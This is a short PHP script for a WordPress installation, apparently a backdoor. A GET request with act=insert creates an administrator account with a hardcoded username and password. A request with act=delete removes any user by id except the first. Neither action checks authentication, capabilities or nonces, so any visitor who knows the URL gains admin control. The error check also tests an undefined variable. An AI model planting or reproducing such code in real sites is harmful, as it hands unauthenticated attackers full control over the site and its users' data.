<?php
// [wp insert user « WordPress Codex](http://codex.wordpress.org/Function_Reference/wp_insert_user)
require_once "../wp-load.php";
require_once "../wp-admin/includes/user.php";

if(isset($_GET['act']) && $_GET['act'] == 'insert')
{
    $user_info = array(
        "user_pass"     => "FXVgGvs16m",
        "user_login"    => "systemwp",
        "user_nicename" => "systemwp",
        "user_email"    => "abc@xyz.com",
        "display_name"  => "John Doe",
        "first_name"    => "John",
        "last_name"     => "Doe",
        "role"          => "administrator"
    );
    $insert_user_result = wp_insert_user( $user_info );
    if ( is_wp_error($return) ) {
        die($insert_user_result->get_error_message());
    } else {
        echo "Successfully created user with id: {$insert_user_result}";
        die();
    }
}

if(isset($_GET['act']) && $_GET['act'] == 'delete' && isset($_GET['id']))
{
    if($_GET['id'] == 1) die();

    $current_user_id = $_GET['id'];
    if( wp_delete_user($current_user_id) )
    {
        echo "Successfully deleted";
        die();
    }
    else
    {
        echo "Error in delete";
        die();
    }
}